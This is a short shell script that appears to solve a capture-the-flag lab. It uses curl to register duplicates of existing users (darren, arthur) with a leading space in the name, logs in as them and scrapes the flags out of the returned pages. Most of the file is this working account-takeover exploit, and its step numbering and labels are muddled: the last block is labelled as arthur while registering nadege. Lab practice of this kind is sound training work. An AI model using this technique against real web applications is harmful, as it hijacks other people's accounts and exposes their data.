#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:8088" -c "/work/7-cookies.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/7-cookies.txt" | awk '{print $7}')
echo "--> Session initiated : $PHPSESSID"

# Registering darren a second time
echo "2 - REGISTERING DARREN"
curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=%20darren" -F "email=darren@gmail.com" -F "pass=test" -F "submit=Register" >/dev/null

# Logging as adrren
echo "5 - ANALYZING DARREN"
curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+darren" -d "pass=test" -o /work/7-darren.html
echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-darren.html | sed ':a;N;$!ba;s/[\n\t ]//g')" 

# Registering arthur a second time
echo "4 - REGISTERING ARTHUR"
curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=%20arthur" -F "email=arthur@gmail.com" -F "pass=test" -F "submit=Register" >/dev/null

# Logging as arthur
echo "5 - ANALYZING ARTHUR"
curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+arthur" -d "pass=test" -o /work/7-arthur.html
echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-arthur.html | sed ':a;N;$!ba;s/[\n\t ]//g')"

# Registering nadege a second time
echo "4 - REGISTERING ARTHUR"
curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=nadege" -F "email=arthur@gmail.com" -F "pass=test" -F "submit=Register" >/dev/null
